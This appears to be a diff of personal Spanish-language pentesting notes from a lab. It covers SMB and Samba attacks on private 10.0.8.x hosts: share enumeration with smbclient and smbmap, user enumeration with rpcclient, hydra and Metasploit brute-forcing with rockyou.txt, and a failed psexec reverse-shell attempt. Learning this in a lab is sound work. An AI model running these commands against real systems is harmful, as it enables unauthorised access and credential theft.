@@ -1,1 +1,67 @@
 smbclient -L 10.0.8.11 -N --> primer escaneo para ver si nos lista algo sin usuarios ni contraseña 
+ smbmap -H 10.0.8.11 -u  'mario' -p '123123' --> mo potente para ver permisos etc 
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        IPC$                                                    NO ACCESS       Remote IPC
+        Users                                                   READ ONLY
+[*] Closed 1 connections                                                                
+
+Fuerza bruta--> $ hydra -l mario -P /usr/share/wordlists/rockyou.txt smb://10.0.8.11
+
+Conectar a el recurso tras listar 
+smbclient -U 'mario' //10.0.8.1/Users      
+
+CON  METASPLOIT
+ USE sf6 auxiliary(scanner/smb/smb_login) > 
+
+msf6 auxiliary(scanner/smb/smb_login) > setg RHOSTS 10.0.8.11
+RHOSTS => 10.0.8.11
+msf6 auxiliary(scanner/smb/smb_login) > set VERBOSE false
+VERBOSE => false
+msf6 auxiliary(scanner/smb/smb_login) > set SMBUser mario
+SMBUser => nmario
+msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
+PASS_FILE => /usr/share/wordlists/rockyou.txt
+msf6 auxiliary(scanner/smb/smb_login) > 
+
+xploit(windows/smb/psexec) > 
+f6 exploit(windows/smb/psexec) > set SMBPass
+SMBPass => 
+msf6 exploit(windows/smb/psexec) > set SMBPass 123123
+SMBPass => 123123
+msf6 exploit(windows/smb/psexec) > set SMBUser mario
+SMBUser => mario
+msf6 exploit(windows/smb/psexec) > run
+[*] Started reverse TCP handler on 10.0.8.12:4444 
+[*] 10.0.8.11:445 - Connecting to the server...
+[*] 10.0.8.11:445 - Authenticating to 10.0.8.11:445 as user 'mario'...
+[-] 10.0.8.11:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode The server responded with an unexpected status code: STATUS_ACCESS_DENIED
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/psexec) > options
+
+SAMBA
+____________________________________
+(kali㉿kali)-[~]
+└─$ rpcclient -U "" -N 10.0.8.13 
+rpcclient $> srvinfo
+        DISCOVER       Wk Sv PrQ Unx NT SNT Samba 4.13.13-Debian
+        platform_id     :       500
+        os version      :       6.1
+        server type     :       0x809a03
+rpcclient $> querydisinfo
+command not found: querydisinfo
+rpcclient $> querydispinfo
+index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: ken      Name:   Desc: 
+index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: takeshi  Name:   Desc: 
+rpcclient $> enundomusers
+command not found: enundomusers
+rpcclient $> enumdomusers
+user:[ken] rid:[0x3e8]
+user:[takeshi] rid:[0x3e9]
+rpcclient $> 
+
+msf6 > use scanner/smb/smb_login
+[*] New in Metasploit 6.4 - The CreateSession option within this module can open an interactive session
+msf6 auxiliary(scanner/smb/smb_login) > 
